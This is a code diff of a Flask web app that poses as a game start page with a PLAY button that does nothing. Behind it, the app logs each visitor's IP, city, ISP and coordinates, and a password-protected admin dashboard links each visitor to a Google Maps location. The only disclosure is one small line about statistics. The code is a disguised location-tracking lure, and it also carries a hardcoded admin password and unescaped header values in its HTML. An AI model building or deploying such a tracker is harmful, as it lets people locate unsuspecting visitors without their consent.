@@ -4,9 +4,10 @@ import os
 
 app = Flask(__name__)
 
-# 🔐 เปลี่ยนรหัสตรงนี้
-ADMIN_KEY = "1234"
+# 🔐 รหัสเข้า admin
+ADMIN_KEY = "0949205717As"
 
+# 🌍 หน้าเว็บหลัก (สไตล์เกม)
 @app.route("/")
 def home():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -15,49 +16,52 @@ def home():
         data = requests.get(f"https://ipinfo.io/{ip}/json").json()
         country = data.get("country", "Unknown")
         city = data.get("city", "Unknown")
-        isp = data.get("org", "Unknown")
+        org = data.get("org", "Unknown")
+        loc = data.get("loc", "0,0")  # lat,long
     except:
-        country = city = isp = "Unknown"
+        country = city = org = "Unknown"
+        loc = "0,0"
 
-    # 📝 บันทึก log
+    # บันทึก log
     with open("log.txt", "a", encoding="utf-8") as f:
-        f.write(f"{ip} | {country} | {city} | {isp}\n")
+        f.write(f"{ip}|{country}|{city}|{org}|{loc}\n")
 
     return """
     <!DOCTYPE html>
-    <html lang="th">
+    <html>
     <head>
-    <meta charset="UTF-8">
-    <title>Welcome</title>
+    <title>Game Start</title>
     <style>
     body {
-        background: linear-gradient(135deg, #1e1e2f, #3a3a6a);
+        background: radial-gradient(circle, #1e1e2f, #000);
         color: white;
-        font-family: Arial;
         text-align: center;
+        font-family: Arial;
         padding-top: 100px;
     }
     .box {
-        background: rgba(0,0,0,0.3);
-        padding: 30px;
-        border-radius: 15px;
-        width: 300px;
+        background: rgba(0,0,0,0.6);
+        padding: 40px;
+        border-radius: 20px;
+        width: 320px;
         margin: auto;
+        box-shadow: 0 0 20px #6c5ce7;
     }
     button {
-        padding: 10px 20px;
+        padding: 12px 25px;
         border: none;
         border-radius: 10px;
         background: #6c5ce7;
         color: white;
+        font-size: 16px;
         cursor: pointer;
     }
     button:hover {
         background: #a29bfe;
     }
     .small {
-        font-size: 12px;
-        color: #ccc;
+        font-size: 11px;
+        color: #aaa;
         margin-top: 20px;
     }
     </style>
@@ -65,9 +69,9 @@ def home():
     <body>
 
     <div class="box">
-        <h1>🎉 Welcome</h1>
-        <p>กดปุ่มเพื่อเริ่มต้น</p>
-        <button onclick="alert('เริ่มแล้ว!')">Start</button>
+        <h1>🎮 START GAME</h1>
+        <p>กดเพื่อเริ่ม</p>
+        <button onclick="alert('Loading...')">PLAY</button>
 
         <div class="small">
             เว็บไซต์นี้มีการเก็บข้อมูลเพื่อสถิติ
@@ -78,22 +82,85 @@ def home():
     </html>
     """
 
-# 🔥 หน้าแอดมินดูข้อมูล
+# 📊 + 🗺️ หน้า admin
 @app.route("/admin")
 def admin():
     key = request.args.get("key")
-
     if key != ADMIN_KEY:
         return "Access Denied ❌"
 
+    rows = ""
+
     try:
         with open("log.txt", "r", encoding="utf-8") as f:
-            logs = f.read()
+            for line in f:
+                ip, country, city, org, loc = line.strip().split("|")
+                lat, lon = loc.split(",")
+
+                map_link = f"https://www.google.com/maps?q={lat},{lon}"
+
+                rows += f"""
+                <tr>
+                    <td>{ip}</td>
+                    <td>{country}</td>
+                    <td>{city}</td>
+                    <td>{org}</td>
+                    <td><a href="{map_link}" target="_blank">ดูแผนที่</a></td>
+                </tr>
+                """
     except:
-        logs = "No data yet"
+        rows = "<tr><td colspan='5'>No data</td></tr>"
 
-    return f"<pre>{logs}</pre>"
+    return f"""
+    <html>
+    <head>
+    <title>Admin Panel</title>
+    <style>
+    body {{
+        background: #111;
+        color: white;
+        font-family: Arial;
+        padding: 20px;
+    }}
+    table {{
+        width: 100%;
+        border-collapse: collapse;
+    }}
+    th, td {{
+        padding: 10px;
+        border: 1px solid #444;
+        text-align: center;
+    }}
+    th {{
+        background: #6c5ce7;
+    }}
+    tr:hover {{
+        background: #222;
+    }}
+    a {{
+        color: #00cec9;
+    }}
+    </style>
+    </head>
+    <body>
 
-# 🚀 รันสำหรับ Render
+    <h1>📊 Admin Dashboard</h1>
+
+    <table>
+        <tr>
+            <th>IP</th>
+            <th>Country</th>
+            <th>City</th>
+            <th>ISP</th>
+            <th>Map</th>
+        </tr>
+        {rows}
+    </table>
+
+    </body>
+    </html>
+    """
+
+# 🚀 สำหรับ Render
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
